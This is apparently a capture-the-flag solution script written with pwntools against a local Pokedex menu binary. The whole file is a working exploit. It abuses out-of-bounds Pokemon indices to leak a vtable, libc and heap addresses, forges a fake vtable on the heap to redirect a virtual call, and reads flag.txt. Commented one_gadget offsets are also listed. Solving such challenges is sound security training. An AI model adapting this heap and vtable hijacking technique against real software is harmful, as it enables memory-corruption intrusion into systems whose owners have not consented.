from pwn import *

p = process("./app")
# p = gdb.debug("./app", gdbscript="""
#     b * main
#     b * pokemon_loop
#     b * _ZN7Pokedex10getPokemonEi
#     c
#     info proc map
# """)

def add_pokemon(idx):
    p.recvuntil(b"\x0a> ");
    p.sendline(b"2")
    p.sendline(str(idx).encode())

def delete_pokemon(idx):
    p.recvuntil(b"\x0a> ");
    p.sendline(b"3")
    p.sendline(str(idx).encode())

def retrieve_pokemon(idx):
    p.recvuntil(b"\x0a> ");
    p.sendline(b"4")
    p.sendline(str(idx).encode())

def retrieved_print():
    p.recvuntil(b"\x0a> ");
    p.sendline(b"1")
    return p.recvline().strip(b"\n")

def retrieved_rename(name):
    p.recvuntil(b"\x0a> ");
    p.sendline(b"2")
    p.sendline(name)

def retrieved_stats():
    p.recvuntil(b"\x0a> ");
    p.sendline(b"3")
    return [
        p.recvline().strip(b"\n"),
        p.recvline().strip(b"\n"),
        p.recvline().strip(b"\n"),
        p.recvline().strip(b"\n")
    ]

def retrieved_cry():
    p.recvuntil(b"\x0a> ");
    p.sendline(b"4")
    return p.recvline().strip(b"\n")

def retrieved_evolve():
    p.recvuntil(b"\x0a> ");
    p.sendline(b"5")
    return p.recvline().strip(b"\n")

# Set up the initial state
add_pokemon(1)
add_pokemon(1)

# Leak the vtable
retrieve_pokemon(662)
leak = retrieved_print()
print(f"vtable leak raw: {leak}")
leak = leak.split(b": ")[-1] + b'\x00\x00'
leak = u64(leak)
print(f"vtable leak: {hex(leak)}")

base_addr = leak - 0x33f0
print(f"base address: {hex(base_addr)}")
print("---")

# Rewrite the heap with a vtable pointer
vt_ptr = base_addr + 0x5c80
print(f"vtable pointer: {hex(vt_ptr)}")
retrieve_pokemon(1)
retrieved_rename(b'AAAAAAA\x00')
retrieve_pokemon(1)
retrieved_rename(p64(vt_ptr))

# Leak the libc address from the vtable
retrieve_pokemon(663)
leak = retrieved_print()
print(f"libcpp leak raw: {leak}")
leak = leak.split(b": ")[-1] + b'\x00\x00'
leak = u64(leak)
print(f"libcpp leak: {hex(leak)}")

libcpp_base = leak - 0x284ac0
print(f"libcpp base: {hex(libcpp_base)}")
libc_base = libcpp_base - 0x1f0000
print(f"libc base: {hex(libc_base)}")

libc_system = libc_base + 0x53400
print(f"libc system: {hex(libc_system)}")
print("---")

# Rewrite the heap with a libc pointer
ptr = libc_base + 0x1e61d9
print(f"libc pointer: {hex(ptr)}")
retrieve_pokemon(1)
retrieved_rename(p64(ptr))

# Leak the heap base address from the libc pointer
retrieve_pokemon(663)
leak = retrieved_print()
print(f"heap leak raw: {leak}")
leak = b"\x00" + leak.split(b": ")[-1] + b'\x00\x00'
heap_base = u64(leak)
print(f"heap base: {hex(heap_base)}")
print("---")

# Write fake vtable
#libc_onegadget = libc_base + 0x0e4d70
#libc_onegadget = libc_base + 0x10330a
#libc_onegadget = libc_base + 0x103312
#libc_onegadget = libc_base + 0x103317
app_rename_random = base_addr + 0x2a10
print(f"app_rename_random: {hex(app_rename_random)}")
vtable_base = heap_base + 0x13768
print(f"vtable base: {hex(vtable_base)}")
retrieve_pokemon(1)
retrieved_rename(b'A'*16 + p64(app_rename_random))
retrieve_pokemon(1)
retrieved_rename(b'A'*7)
retrieve_pokemon(1)
retrieved_rename(p64(vtable_base))
print("---")

# Trigger gadget
retrieve_pokemon(663)
retrieved_rename(b"flag.txt\x00")

# Print flag
retrieve_pokemon(663)
print("Flag:", retrieved_print())

p.interactive()
